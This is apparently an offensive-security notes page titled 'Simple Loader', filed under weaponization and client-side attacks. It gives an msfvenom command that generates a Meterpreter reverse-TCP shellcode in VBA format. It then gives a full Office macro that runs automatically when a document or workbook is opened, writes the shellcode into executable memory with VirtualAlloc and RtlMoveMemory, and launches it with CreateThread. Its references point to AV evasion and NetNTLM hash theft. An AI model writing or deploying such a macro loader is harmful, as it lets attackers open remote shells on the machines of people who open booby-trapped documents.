# Simple Loader

Generate the shellcode.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f vba
```

```vb
#If Vba7 Then
        Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThread As Long, ByVal dwSize As Long, ByVal lpAddress As LongPtr, lpParameter As Long, ByVal dwCreation As Long, lpThread As Long) As LongPtr
        Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocation As Long, ByVal flProtect As Long) As LongPtr
        Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As LongPtr
#Else
        Private Declare Function CreateThread Lib "kernel32" (ByVal lpThread As Long, ByVal dwSize As Long, ByVal lpAddress As Long, lpParameter As Long, ByVal dwCreation As Long, lpThread As Long) As Long
        Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocation As Long, ByVal flProtect As Long) As Long
        Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long) As Long
#EndIf

Sub Auto_Open()
        Dim myByte As Long, myArray As Variant, offset As Long
#If Vba7 Then
        Dim rwxpage As LongPtr, res As LongPtr
#Else
        Dim rwxpage As Long, res As Long
#EndIf
        ' Add the shellcode in this array either a decimal base 10 or hexadecimal base 16 (&H22 as in \x22)
        ' 
        myArray = Array(&H90)

        rwxpage = VirtualAlloc(0, UBound(myArray), &H1000, &H40)
        For offset = LBound(myArray) To UBound(myArray)
                myByte = myArray(offset)
                res = RtlMoveMemory(rwxpage + offset, myByte, 1)
        Next offset
        res = CreateThread(0, 0, rwxpage, 0, 0, 0)
End Sub
Sub AutoOpen()
        Auto_Open
End Sub
Sub Workbook_Open()
        Auto_Open
End Sub
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/C/Malware Development/Simple Loader/Virtual Allocation/WinAPI]]

### San3ncrypt3d

- [San3ncrypt3d: Running ShellCode in Memory | AV Evasion â€“ VBA Version](https://san3ncrypt3d.com/2021/08/13/VBAShell/)

### Osanda

- [Osanda: Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)